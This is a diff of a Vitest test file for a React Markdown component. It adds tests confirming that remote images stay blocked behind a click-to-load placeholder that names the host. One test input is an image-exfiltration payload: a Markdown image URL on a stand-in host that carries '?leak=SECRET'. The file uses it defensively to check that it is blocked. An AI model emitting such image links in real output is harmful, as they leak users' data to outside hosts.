@@ -1,9 +1,15 @@
-import { describe, expect, it } from "vitest";
+// @vitest-environment jsdom
+import { afterEach, describe, expect, it, vi } from "vitest";
+import { cleanup, render as renderDom, screen } from "@testing-library/react";
+import userEvent from "@testing-library/user-event";
 import { renderToStaticMarkup } from "react-dom/server";
 import { Markdown } from "./Markdown";
 import { replyMarkdown } from "./CopyMessage";
+import { LinksProvider } from "./previewContext";
 
 const render = (text: string, query?: string) => renderToStaticMarkup(<Markdown text={text} query={query} />);
+
+afterEach(cleanup);
 
 describe("Markdown", () => {
   it("highlights tagged code, and guesses the language of untagged code, on every render", () => {
@@ -19,6 +25,31 @@ describe("Markdown", () => {
     const html = render("Restart the **gateway**.\n\n```bash\nsystemctl restart gateway\n```", "GATEWAY");
     expect(html.match(/<mark class="hit">gateway<\/mark>/g)).toHaveLength(2);
     expect(render("Restart the gateway.", "")).not.toContain("<mark");
+  });
+
+  it("asks before loading a remote image, naming its host (#341)", () => {
+    for (const text of ["![x](https://example.test/p.png?leak=SECRET)", "![x](//example.test/p.png?leak=SECRET)"]) {
+      const html = render(text);
+      expect(html).not.toMatch(/<img|<link/);
+      expect(html).toContain("example.test");
+    }
+  });
+
+  it("loads a remote image once its placeholder is clicked, without following a link around it", async () => {
+    const preview = vi.fn();
+    const { container } = renderDom(
+      <LinksProvider preview={preview} web={{ openInBrowser: vi.fn() }} onToast={vi.fn()}>
+        <Markdown text="[![chart](https://example.test/p.png)](https://example.test/page)" />
+      </LinksProvider>,
+    );
+    expect(container.querySelector("img")).toBeNull();
+    await userEvent.click(screen.getByRole("button", { name: /example\.test/ }));
+    expect(preview).not.toHaveBeenCalled();
+    expect(container.querySelector("img")?.getAttribute("src")).toBe("https://example.test/p.png");
+    expect(container.querySelector("img")?.getAttribute("alt")).toBe("chart");
+    expect(screen.queryByRole("button", { name: /example\.test/ })).toBeNull();
+    await userEvent.click(container.querySelector("img")!);
+    expect(preview).toHaveBeenCalledWith({ kind: "web", url: "https://example.test/page" });
   });
 });
 
